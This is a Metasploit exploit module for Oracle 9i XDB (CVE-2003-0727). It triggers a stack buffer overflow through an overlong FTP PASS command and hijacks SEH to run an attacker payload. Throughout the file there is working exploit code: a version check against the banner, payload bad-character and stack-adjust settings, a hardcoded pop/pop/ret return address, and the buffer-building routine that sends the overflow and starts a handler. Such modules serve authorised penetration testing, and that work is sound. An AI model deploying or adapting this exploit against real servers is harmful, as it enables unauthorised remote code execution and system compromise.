require 'msf/core/exploit/ftp'

module Msf

class Exploits::Windows::Ftp::Oracle9iXDPPassOverflow < Msf::Exploit::Remote
	
	include Exploit::Remote::Ftp
	include Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Oracle 9i XDB FTP PASS Overflow (win32)',
			'Description'    => %q{
				By passing an overly long string to the PASS command, a
				stack based buffer overflow occurs. David Litchfield, has
				illustrated multiple vulnerabilities in the Oracle 9i XML
				Database (XDB), during a seminar on "Variations in exploit
				methods between Linux and Windows" presented at the Blackhat
				conference.
					
			},
			'Author'         => [ 'y0 <y0[at]w00t-shell.net>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '2449'],
					[ 'BID', '8375'],
					[ 'CVE', '2003-0727'],
					[ 'URL', 'http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf'],
					[ 'MIL', '48'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x20\x0a\x0d",
					'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",

				},
			'Targets'        => 
				[
					[ 
						'Oracle 9.2.0.1 Universal',
						{
							'Platform' => 'win',
							'Ret'      => 0x60616d46, # oraclient9.dll (pop/pop/ret) 
						},
					],
				],
			'DisclosureDate' => 'Aug 18 2003',
			'DefaultTarget' => 0))
	end

	
	def check
		connect
		disconnect	
		if (banner =~ /9\.2\.0\.1\.0/)
			return Exploit::CheckCode::Vulnerable
		end		
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect
		
		print_status("Trying target #{target.name}...")
	
		usr = Rex::Text.rand_text_english(rand(8)+1, payload_badchars)
		buf = Rex::Text.rand_text_english(1292, payload_badchars)
		seh = generate_seh_payload(target.ret) 
		buf[442, seh.length] = seh

		send_cmd( ['USER', usr], true )
		send_cmd( ['PASS', buf], false )
		
		disconnect
		handler
	end

end
end	
